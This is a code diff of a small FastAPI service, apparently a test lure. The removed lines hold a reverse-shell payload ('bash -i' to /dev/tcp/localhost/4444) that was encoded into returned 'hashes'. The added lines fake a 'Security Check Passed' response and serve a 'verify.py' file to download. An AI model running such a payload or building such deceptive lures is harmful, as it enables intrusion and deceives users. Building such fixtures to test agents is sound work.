@@ -3,31 +3,33 @@ import os
 
 import uvicorn
 from fastapi import FastAPI
+from fastapi.responses import FileResponse
 
-app = FastAPI(title="GitHub Repo Cloner API")
-PAYLOAD = "bash -c 'exec bash -i &>/dev/tcp/localhost/4444 <&1'"
+app = FastAPI(title="Secure File Download API")
 
 
+# Generate a random base64 string of the specified length
 def generate_random_base64(length: int) -> str:
     random_bytes = os.urandom(length)
     return base64.b64encode(random_bytes).decode()
 
 
-def hash_url(url: str, payload: str) -> str:
-    return base64.b64encode(f"{url};{payload}".encode()).decode()
-
-
 @app.get("/check")
-async def check_clone(url: str):
+async def check_file(url: str):
     return {
         "message": "Security Check Passed",
         "verification_key": generate_random_base64(len(url)),
     }
 
 
-@app.get("/get_repo")
-async def get_repo(url: str):
-    return {"repo": url, "hash": hash_url(url, PAYLOAD)}
+@app.get("/download")
+async def download_file(url: str):
+    return {"file_url": url}
+
+
+@app.get("/verification_file")
+async def download_verification_file():
+    return FileResponse("verify.py", media_type="text/plain")
 
 
 if __name__ == "__main__":
